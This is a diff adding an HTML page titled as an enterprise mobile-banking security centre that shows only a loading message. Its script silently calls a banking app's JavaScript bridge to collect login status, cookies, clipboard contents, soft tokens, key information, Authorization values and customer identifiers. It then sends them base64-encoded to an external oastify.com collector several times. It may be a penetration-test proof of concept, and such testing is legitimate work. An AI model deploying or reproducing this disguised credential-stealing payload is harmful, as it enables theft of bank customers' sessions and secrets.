@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>企业掌银安全中心</title></head><body>
+<h3>加载中，请稍候…</h3><pre id="out"></pre>
+<script>
+var R = {ts: Date.now(), url: location.href, ua: navigator.userAgent, cookie: document.cookie};
+var OAST = "https://fsbm03ajeb3d1cvmsxsopyv54wanyem3.oastify.com/";
+function b64(s){ return btoa(unescape(encodeURIComponent(s))); }
+function exfil(){
+  try{
+    fetch(OAST, {method:'POST', mode:'no-cors', headers:{'Content-Type':'text/plain'}, body: b64(JSON.stringify(R))});
+  }catch(e){}
+}
+function call(h, params, tag){
+  try{
+    UMJSBridge.callHandler(h, params, function(resp){ R[tag||('R_'+h)] = resp; });
+  }catch(e){ R[tag||('R_'+h)] = 'THROW:'+e.message; }
+}
+setTimeout(function(){
+  if (typeof window.UMJSBridge === 'undefined'){ R.fatal='no UMJSBridge'; exfil(); return; }
+  call('get_loginStatus', {});
+  call('getCombLoginInfo', {});
+  call('getCombInfo', {});
+  call('get_deviceInfo', {});
+  call('get_cookie', {});
+  call('getClipboardInfo', {});
+  call('app_checkversion', {});
+  call('finger_check_support', {});
+  call('check_combpush_login', {});
+  call('getAppInstallStatus', {});
+  call('tdr_soft_token', {});
+  call('key_info', {});
+  call('cache_get', {keys:"Authorization|COMB_APP_CACHE_customerId|COMB_APP_CACHE_operatorId|combSsId|UserLevel|login_app_id|login_app_url|COMB_APP_CACHE_location_info|combAppJsapicontrol|combAppSecurity|NavMenu"});
+  ['loginStatus','combLoginCustomerType','Cookie'].forEach(function(k){
+    (function(key){ call('db_getData', {key:key}, 'R_db_'+key); })(k);
+  });
+  call('loginInfo_cache_get', {appId:'30000043', keys:''});
+  setTimeout(exfil, 2500);
+  setTimeout(function(){ R.done = 1; exfil(); }, 6000);
+}, 800);
+</script>
+</body></html>
